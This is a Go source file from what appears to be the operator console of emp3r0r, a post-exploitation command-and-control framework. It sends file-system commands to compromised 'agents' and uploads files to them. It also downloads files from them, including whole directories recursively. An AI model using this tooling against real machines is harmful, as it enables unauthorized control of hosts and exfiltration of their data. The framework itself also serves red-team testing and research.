//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

// LsDir cache items in current directory
var LsDir []string

func FSCmdDst(cmd string) {
	inputSlice := util.ParseCmd(cmd)

	args := strings.Join(inputSlice[1:], "' '")
	executeCmd(fmt.Sprintf("%s --dst '%s'", inputSlice[0], args))
}

func FSCmdSrcDst(cmd string) {
	inputSlice := util.ParseCmd(cmd)
	cmdname := inputSlice[0]

	if len(inputSlice) < 3 {
		CliPrintError("%s requires source and destination arguments", cmdname)
		return
	}

	src := inputSlice[1]
	dst := inputSlice[2]

	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmdname, src, dst))
}

func FSNoArgCmd(cmd string) {
	executeCmd(cmd)
}

func UploadToAgent(cmd string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := util.ParseCmd(cmd)
	if len(inputSlice) != 3 {
		CliPrintError("put <local path> <remote path>")
		return
	}

	if err := PutFile(inputSlice[1], inputSlice[2], target); err != nil {
		CliPrintError("Cannot put %s: %v", inputSlice[2], err)
	}
}

func DownloadFromAgent(cmd string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := util.ParseCmd(cmd)
	if len(inputSlice) < 2 {
		CliPrintError("get [-r] <file path>")
		return
	}
	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(inputSlice[0], pflag.ContinueOnError)
	isRecursive := flags.BoolP("recursive", "r", false, "Download recursively")
	flags.Parse(inputSlice[1:])

	fileToGet := strings.Join(inputSlice[1:], " ")
	if *isRecursive {
		fileToGet = strings.Join(inputSlice[2:], " ")
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget(fmt.Sprintf("get --file_path %s --offset 0 --token %s", fileToGet, uuid.NewString()), cmd_id)
		if err != nil {
			CliPrintError("Cannot get %s: %v", inputSlice[1], err)
			return
		}
		CliPrintInfo("Waiting for response from agent %s", target.Tag)
		var result string
		var exists bool
		for i := 0; i < 10; i++ {
			result, exists = CmdResults[cmd_id]
			if exists {
				CliPrintInfo("Got file list from %s", target.Tag)
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd_id)
				CmdResultsMutex.Unlock()
				if result == "" {
					CliPrintError("Cannot get %s: empty file list in directory", inputSlice[1])
				}
				break
			}
			time.Sleep(1 * time.Second)
		}
		CliPrintDebug("Got file list: %s", result)

		// download files
		files := strings.Split(result, "\n")
		for _, file := range files {
			if file == "" {
				continue
			}
			go func() {
				if err := GetFile(file, target); err != nil {
					CliPrintError("Cannot get %s: %v", file, err)
				}
			}()
		}
		CliPrintInfo("Downloaded %d files", len(files))
	} else {
		go func() {
			if err := GetFile(fileToGet, target); err != nil {
				CliPrintError("Cannot get %s: %v", inputSlice[1], err)
			}
		}()
	}
}

func executeCmd(cmd string) {
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		CliPrintError("%s failed: %v", cmd, err)
	}
}
